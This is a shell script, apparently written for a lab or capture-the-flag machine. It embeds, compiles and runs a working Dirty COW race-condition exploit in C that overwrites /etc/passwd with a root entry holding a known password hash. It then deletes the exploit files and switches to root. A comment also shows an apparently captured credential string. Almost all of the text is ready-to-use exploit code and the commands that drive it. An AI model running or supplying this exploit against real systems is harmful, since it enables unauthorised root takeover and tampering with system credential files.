#! /bin/sh

# scp exploit zaz@192.168.56.105:/home/zaz
# 646da671ca01bb5d84dbb5fb2238dc8e

# ssh zaz@192.168.56.105

cat << EOF > exploit.c
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <unistd.h>
int f                                      ;
void *map                                  ;
pid_t pid                                  ;
pthread_t pth                              ;
struct stat st                             ;
void *madviseThread(void *arg)             {
  int i,c=0                                ;
  for(i=0;i<200000000;i++)
    c+=madvise(map,100,MADV_DONTNEED);
                                           }
int main(int argc,char *argv[])            {
  if(argc<3)return 1                       ;
  f=open(argv[1],O_RDONLY)                 ;// open read only file
  fstat(f,&st)                             ;// stat the fd
  map=mmap(NULL                            ,// mmap the file
           st.st_size+sizeof(long)         ,// size is filesize plus padding
           PROT_READ                       ,// read-only
           MAP_PRIVATE                     ,// private mapping for cow
           f                               ,// file descriptor
           0)                              ;// zero
	printf("Changing root's password, this may take a while...\n");
  pid=fork()                               ;// fork process
  if(pid)                                  {// if parent
    waitpid(pid,NULL,0)                    ;// wait for child
    int u,i,o,c=0,l=strlen(argv[2])        ;// util vars (l=length)
    for(i=0;i<10000/l;i++)//////////////////// loop to 10K divided by l
      for(o=0;o<l;o++)//////////////////////// repeat for each byte
        for(u=0;u<10000;u++)////////////////// try 10K times each time
          c+=ptrace(PTRACE_POKETEXT        ,// inject into memory
                    pid                    ,// process id
                    map+o                  ,// address
                    *((long*)(argv[2]+o))) ;// value
                                           }// otherwise
  else                                     {// child
    pthread_create(&pth                    ,// create new thread
                   NULL                    ,// null
                   madviseThread           ,// run madviseThred
                   NULL)                   ;// null
    ptrace(PTRACE_TRACEME)                 ;// stat ptrace on child
    kill(getpid(),SIGSTOP)                 ;// signal parent
    pthread_join(pth,NULL)                 ;// wait for thread
                                           }// / child
  return 0                                 ;// return
}
EOF
gcc -pthread exploit.c -o pokemon
./pokemon /etc/passwd "root:fiw.I6FqpfXW.:0:0:root:/root:/bin/bash"
rm pokemon
rm exploit.c

echo "The password is root :)"
su root
